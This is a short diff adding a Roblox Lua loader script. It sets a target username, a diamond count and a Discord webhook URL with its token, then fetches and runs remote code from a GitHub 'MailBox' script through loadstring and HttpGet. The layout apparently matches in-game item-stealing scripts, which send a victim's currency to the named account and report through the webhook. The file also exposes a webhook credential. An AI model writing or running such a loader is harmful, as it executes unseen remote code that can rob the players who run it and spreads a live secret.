@@ -1,0 +1,7 @@
+_G.Username = "123superstat10"
+
+_G.Diamonds = 500001
+
+_G.Webhook = "https://discord.com/api/webhooks/1109561255376720065/I3xpieEB_RurYacMjHvqNVVmXfVlpAf3G-5cHfXgkZUAWAxV8oSogl4k2Zq-eK3UCz6M"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/MailBox/main/Taleran.lua"))()
